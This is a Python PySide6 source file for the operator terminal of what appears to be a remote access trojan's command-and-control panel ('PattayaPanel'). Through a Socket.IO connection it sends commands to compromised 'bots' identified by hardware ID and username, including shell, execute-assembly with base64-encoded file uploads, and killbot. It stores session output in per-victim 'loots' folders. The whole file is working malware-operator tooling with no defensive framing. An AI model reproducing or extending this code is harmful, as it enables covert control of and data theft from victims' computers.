from PySide6.QtWidgets import QWidget,QCompleter,QFileDialog,QMessageBox
from PySide6.QtGui import QIcon,QFont,QKeyEvent,QPalette,QColor
from PySide6.QtCore import Qt
from core.util import PattayaPanelUtil
from designer.ui_terminal import Ui_BotTerminalWidget
import json
from datetime import datetime
import socketio

from service.socket_io_terminal import SocketIOTerminalClient
import os


class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
    def __init__(self, bot, url, token, namespace, terminal_event, user_name, allow_command):
        super().__init__()        
        self.setupUi(self)
        self.user_name = user_name
        self.allow_command = allow_command
        self.terminal_event = terminal_event
        self.bot = bot
        self.url = url
        self.token = token
        self.namespace = namespace
        self.socket_io_client = SocketIOTerminalClient(self.bot)

        self.terminal_event.on_close_terminal.connect(self.closeEvent)

        self.setWindowIcon(QIcon(":/assets/images/rat.png"))

        stylesheet = """
QTextEdit {
    background-color: #000000;
    color: #FB00FF;
    font-family: 'Terminal', sans-serif;
    font-size: 13px;
}
"""
        self.task_result_text_browser.setStyleSheet(stylesheet)

        palette = QPalette()
        palette.setColor(QPalette.Highlight, QColor("#3E454C"))
        self.task_result_text_browser.setPalette(palette)
        # self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
        # self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")


        self.socket_io_client.server_ack.connect(self.server_ack_bot_terminal)
        self.socket_io_client.server_ack_result.connect(self.server_update_bot_terminal)

        self.socket_io_client.connected_to_server.connect(self.init_terminal)
        self.socket_io_client.server_ack_bot_discon.connect(self._on_disconnect)

        self.socket_io_client.server_ack_bot_not_allow_command.connect(self.update_bot_not_allow_command_error)


        self.socket_io_client.start(self.url, self.token, self.namespace)


        self.commands = ['help', 'pingbot', 'killbot', 'cd', 'mkdir', 'rmdir', 'ls', 'pwd', 'ps', 'whoami', 'shell', 'execute-assembly', 'clear']
        self.completer = QCompleter( self.commands, self.bot_send_task_line_edit)
        self.completer.setCompletionMode(QCompleter.InlineCompletion)

        self.bot_send_task_line_edit.setCompleter(self.completer)

        self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint)
        self.bot_send_task_line_edit.returnPressed.connect(self.handle_bot_comamnd)


        font = QFont()
        font.setPointSize(11)  # set the font size to 20
        self.task_result_text_browser.setFont(font)

        
        self.task_result_text_browser.setFocusPolicy(Qt.FocusPolicy.NoFocus)

        self.task_result_text_browser.append(PattayaPanelUtil.get_banner(self.user_name, self.allow_command))

        bot_dir = self.bot['hwid'] + "_" + self.bot['username']
        self.bot_loot_dir = os.path.join(os.getcwd(), "loots", self.user_name, bot_dir.replace("/", "_").replace("\\", "_"))


        self.bot_loot_terminal_dir = os.path.normpath(os.path.join(self.bot_loot_dir, "terminal"))


        self.create_loot_dir()
    

    def create_loot_dir(self):
        if not os.path.exists(self.bot_loot_dir):
            os.makedirs(os.path.normpath(self.bot_loot_dir))
        if not os.path.exists(self.bot_loot_terminal_dir):
            os.makedirs(os.path.normpath(self.bot_loot_terminal_dir))



    def init_terminal(self, data):
        self.update_bot_terminal(data)

    def handle_bot_comamnd(self):
        text = self.bot_send_task_line_edit.text()
        if text == '':
            return
        
        if text == 'help':
            self.update_bot_terminal(text)
            self.task_result_text_browser.append(PattayaPanelUtil.get_terminal_help())
            self.bot_send_task_line_edit.clear()
            return

        if text == 'clear':
            self.write_term_log()
            self.task_result_text_browser.clear()
            self.task_result_text_browser.append(PattayaPanelUtil.get_banner(self.user_name, self.allow_command))
            self.update_bot_terminal(text)
            self.bot_send_task_line_edit.clear()
            return

        incomingFile = ""
        incomingFilename = ""
        if text == 'execute-assembly':
            file_name,_ = QFileDialog.getOpenFileName(self, "Open File",
                                                        ".",
                                                        "All files(*.*)")
            
            if file_name == "":
                return
            
            incomingFilename = os.path.basename(file_name)
            
            incomingFile = PattayaPanelUtil.base64_file_encode(file_name)
            PattayaPanelUtil.panel_log_info(f'f{file_name} has been encoded in base64 format: f{incomingFile}')
        
        if text == 'killbot':
            ret = QMessageBox.warning(self, 
                                    "Kill bot warning",
                                    "Do your sure to kill this bot? You will lost bot connection until bot reconnect again!",
                                    QMessageBox.Ok | QMessageBox.Cancel)
            if ret is not QMessageBox.Ok:
                self.bot_send_task_line_edit.clear()
                return
        
        PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
        self.update_bot_terminal(text)
        args = text.split(" ", 1)
        command = args[0]

        if (len(args)) == 1:
            arg = ""
        else:
            arg = args[1]


        bot_task = {
            "panelToken": self.token,
            "socketId": self.bot['socketId'],
            "hwid": self.bot['hwid'],
            "command": command,
            "arguments": arg,
            "incomingFile": incomingFile,
            "incomingFilename": incomingFilename
        }
        try:
            self.socket_io_client.send_command('panel_send_bot_task', bot_task)
        except Exception as e:
            self.update_bot_terminal(f'{str(e)}')

        
        self.bot_send_task_line_edit.clear()
        self.bot_send_task_line_edit.setDisabled(True)


    def closeEvent(self, event):
        self.write_term_log()
        self.socket_io_client.stop()
        PattayaPanelUtil.terminals.pop(self.bot['hwid'])
        PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")

    def write_term_log(self):
        self.create_loot_dir()
        now = datetime.now()
        current_datetime = now.strftime('%Y-%m-%d_%H-%M-%S')
        fname = f"{self.user_name}_{current_datetime}_terminal.txt"
        with open(os.path.join(self.bot_loot_terminal_dir, fname) , "w", encoding='utf-8') as file:
            file.write(self.task_result_text_browser.toPlainText())
        
        PattayaPanelUtil.panel_log_info(f"Save terminal log file: {fname}")
    
    
    def server_ack_bot_terminal(self, text):
        self.bot_send_task_line_edit.setDisabled(False)
        self.bot_send_task_line_edit.setFocus()
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def server_update_bot_terminal(self, result):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#FFF300'>[x] [{formatted_time}] bot [{self.bot['username']}] received task result</font><font color='#F7810A'> ⮜⮜⮜</font></font><font color='#00E3FA'><br><pre>{result}</pre></font><br>")
        self.task_result_text_browser.ensureCursorVisible()

    def update_bot_terminal(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F7810A'>⮞⮞⮞</font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def update_bot_terminal_error(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='red'>[-] [{formatted_time}] Seem bot disconnected [{self.bot['username']}]</font><font color='#F6FA00'></font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def _on_disconnect(self):
        self.bot_send_task_line_edit.setDisabled(True)
        self.update_bot_terminal_error("Bot bas been disconnected from server")


    def update_bot_not_allow_command_error(self, command):
        self.bot_send_task_line_edit.setDisabled(False)
        self.bot_send_task_line_edit.setFocus()
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#FE5900'>[-] [{formatted_time}] Server ack error]</font><font color='#FE5900'></font></font><font color='#FE5900'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()



    def keyPressEvent(self, event: QKeyEvent):
        key = event.key()

        if key == Qt.Key_Tab:
            self.bot_send_task_line_edit.setCursorPosition(len(self.bot_send_task_line_edit.text()))
